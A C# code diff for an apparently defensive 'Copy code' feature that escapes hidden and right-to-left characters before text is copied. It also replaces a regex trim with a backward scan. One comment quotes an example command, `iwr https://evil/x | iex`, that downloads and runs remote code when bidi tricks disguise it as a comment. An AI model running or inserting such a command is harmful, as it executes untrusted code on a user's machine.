@@ -10,7 +10,7 @@ namespace AgentBridge.App.Core;
 // `echo ok # check; iwr https://evil/x | iex`, a harmless comment, for a command that runs the
 // download. So Copy takes the escapes too: a shell it is pasted into gets `\u2067` literally,
 // never a command the person did not see.
-public sealed partial class CodeCopy : Observable
+public sealed class CodeCopy : Observable
 {
     // The button's name stays this whatever it shows; what happened is announced separately.
     public const string Name = "Copy code";
@@ -30,7 +30,7 @@ public sealed partial class CodeCopy : Observable
     // hold it open). Its timer's callback comes back through ui, on the UI thread in the app.
     public CodeCopy(MdCode code, Func<string, bool> put, IUiDispatcher? ui = null, TimeProvider? time = null)
     {
-        Text = TrailingBlankLines().Replace(HiddenText.Reveal(code.Text, rightToLeft: true), "");
+        Text = WithoutTrailingBlankLines(HiddenText.Reveal(code.Text, rightToLeft: true));
         RightToLeft = HiddenText.HasRightToLeft(code.Text);
         Hidden = HiddenText.HasHidden(code.Text);
         this.put = put;
@@ -44,8 +44,19 @@ public sealed partial class CodeCopy : Observable
     // line with anything else on it stay, as they are part of it.
     public string Text { get; }
 
-    [System.Text.RegularExpressions.GeneratedRegex(@"(?:\n[^\S\n]*)+$")]
-    private static partial System.Text.RegularExpressions.Regex TrailingBlankLines();
+    // From the end, past whitespace back to the first line break with only whitespace after it; a
+    // backward scan, as a regex trim backtracks quadratically over long runs of blank lines.
+    static string WithoutTrailingBlankLines(string text)
+    {
+        var end = text.Length;
+        for (var i = text.Length - 1; i >= 0; i--)
+        {
+            var c = text[i];
+            if (c == '\n') { end = i; }
+            else if (!char.IsWhiteSpace(c)) { break; }
+        }
+        return text[..end];
+    }
 
     // Right-to-left letters reorder what is drawn around them with no control at all, so they are
     // escaped too (HiddenText.Reveal), and the block says it held them (RightToLeftNote).
